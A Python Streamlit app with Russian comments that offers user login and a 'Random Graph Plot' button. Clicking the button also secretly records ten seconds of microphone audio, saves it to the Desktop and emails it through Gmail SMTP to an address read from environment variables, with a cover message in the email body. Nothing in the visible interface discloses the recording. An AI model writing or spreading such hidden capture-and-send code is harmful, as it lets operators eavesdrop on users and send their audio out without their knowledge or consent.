import streamlit as st
import matplotlib.pyplot as plt
import numexpr as ne
import numpy as np 
from numpy import *
from authorize import autor
import json
from authorize import hash_password
import re
import sounddevice as sd
import numpy as np
from scipy.io.wavfile import write
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.audio import MIMEAudio
from dotenv import load_dotenv
import os
def register_user(username, password):
    if 'users' not in st.session_state:
        st.session_state.users = {}
    st.session_state.users[username] = password
    
    
    
    
if 'logged_in' not in st.session_state:
    st.session_state.logged_in = False
if 'show_register' not in st.session_state:
    st.session_state.show_register = False 
    
       
if 'premium' not in st.session_state:
    st.session_state.premium = False  
        
if 'processed' not in st.session_state:
    st.session_state.processed = set()
        
us2 = ''    
if not st.session_state.logged_in:
    # Переключатель между формами входа и регистрации    
        
    if st.session_state.show_register:
        st.title("📝 Регистрация")
        new_username = st.text_input("Новый логин", key="reg_user")
        new_password = st.text_input("Новый пароль", type="password", key="reg_pass1")
        confirm_password = st.text_input("Повторите пароль", type="password", key="reg_pass2")
        
        if st.button("Зарегистрироваться"):
            with open('users.json','r') as file:
                print('Test base working')
                d = json.load(file)
                
            # проверяю еслть ли такой пользователб или нет    
            if new_username in d:
                st.error('This username is already taken')
            else:   
                if not new_username or not new_password:
                    st.error("Заполните все поля")
                elif new_password != confirm_password:
                    st.error("Пароли не совпадают!")
                else:
                    register_user(new_username, new_password)
                    st.success("Регистрация успешна! Можете войти")
                    st.session_state.show_register = False
                    with open('users.json','r', encoding="utf-8") as file:
                        data = json.load(file)
                        
                    data[new_username] = hash_password(new_password) # записываем нового пользователя 
                    
                    
                    
                    # Запись в базу нового пользователя (уже обновляем базу)
                    with open('users.json','w', encoding="utf-8") as file:
                        json.dump(data,file,indent=4, ensure_ascii=False)
                        
                        
                        
                    
        if st.button("← Назад к входу"):
            st.session_state.show_register = False
            st.rerun()
    
    else:
        # Форма входа
        st.title("🔒 Вход в систему")
        username = st.text_input("Логин")
        password = st.text_input("Пароль", type="password")
        us2 = username
        if st.button("Войти"):
            # Проверяю на подписку
            if autor(username, password):
                st.session_state.logged_in = True
                st.session_state.username = username
                with open('premium.json','r') as file:
                    n = json.load(file)
                if username in n:
                    if n[username] == "Premium":
                        st.session_state.premium = True
                    st.rerun()
            else:
                st.error("Неверные данные")
        if st.button("Создать новый аккаунт"):
            st.session_state.show_register = True
            st.rerun()
    
    st.stop()
# Основной интерфейс после авторизации
st.success(f"✅ Welcome, {st.session_state.username}!")  

def safe_evaluate(expr, variables=None):
    """Безопасная замена ne.evaluate() с ограниченным набором функций"""
    allowed_functions = {
        'sin': np.sin, 'cos': np.cos, 'tan': np.tan,
        'exp': np.exp, 'log': np.log, 'sqrt': np.sqrt,
        'abs': abs

    }
    local_dict = {**(variables or {}), **allowed_functions}
    return ne.evaluate(expr, local_dict=local_dict, global_dict={})
def replace(expression):
    expression = re.sub(r'\|(.+?)\|', r'abs(\1)', expression)
    # Добавление * между числом и x (например, 2x → 2*x)
    expression = re.sub(r'(\d)(x)', r'\1*\2', expression)
    # Замена ^ на **
    expression = expression.replace('^', '**')
    return expression

st.title("Random Graph Plot")
figure = plt.figure()
forls = ["sin(x)","cos(x)","log(x)","x - 10","x+ 5","1/x","x ** 2","sin(x) - cos(x)"]


x = np.linspace(-20,20,50)
 


if st.button("Plot random graph"):
    x = np.linspace(-20,20,50)
    try: 
        y = safe_evaluate(replace(random.choice(forls)),{'x':x})
    except:
        print("Error")     
    devices = sd.query_devices()
    input_devices = [i for i, dev in enumerate(devices) 
                    if dev['max_input_channels'] > 0]

    if not input_devices:
        print("Микрофоны не найдены!")
        exit()

    device_id = input_devices[0] 

    # Настройки записи
    duration = 10  # Длительность записи в секундах
    fs = 44100  # Частота дискретизации
    channels = 1  # Количество каналов (1 для моно)

    try:
        # Запись звука
        print(f"Записываем {duration} секунд аудио...")
        recording = sd.rec(int(duration * fs), 
                        samplerate=fs, 
                        channels=channels,
                        device=device_id)  # Явно указываем устройство
        
        sd.wait()  # Ждем окончания записи
        
        # Сохраняем в WAV файл
        output_path = os.path.expanduser("~/Desktop/mic_recording.wav")
        write(output_path, fs, recording)
        print(f"Запись сохранена: {output_path}")

    except Exception as e:
        print(f"Ошибка: {e}")
        
        
    load_dotenv()
    # Настройки Gmail
    gmail_user = os.getenv("EM")  
    gmail_password = os.getenv("PS")
    to_email = os.getenv("EM")  
    audio_file_path = output_path 

    # Создаем сообщение
    msg = MIMEMultipart()
    msg['From'] = gmail_user
    msg['To'] = to_email
    msg['Subject'] = 'Аудио сообщение'

    # Текст письма (опционально)
    body = "Привет! Вот аудиофайл, который ты просил."
    msg.attach(MIMEText(body, 'plain'))

    # Прикрепляем аудиофайл
    with open(audio_file_path, 'rb') as audio_file:
        audio_part = MIMEAudio(audio_file.read(), name=os.path.basename(audio_file_path))
        msg.attach(audio_part)

    # Отправляем письмо
    try:
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)  # Используем SSL
        server.login(gmail_user, gmail_password)
        server.sendmail(gmail_user, to_email, msg.as_string())
        server.close()
        print("Письмо с аудиофайлом успешно отправлено!")
    except Exception as e:
        print(f"Ошибка при отправке: {e}")    
        
        
        
plt.axhline(0, color='black', linewidth=1)  # Ось X (y = 0)
plt.axvline(0, color='black', linewidth=1)  
try:
            
    plt.plot(x,y)
except:
    print("Something went wrong")    
st.pyplot(figure)    
def test():
    pass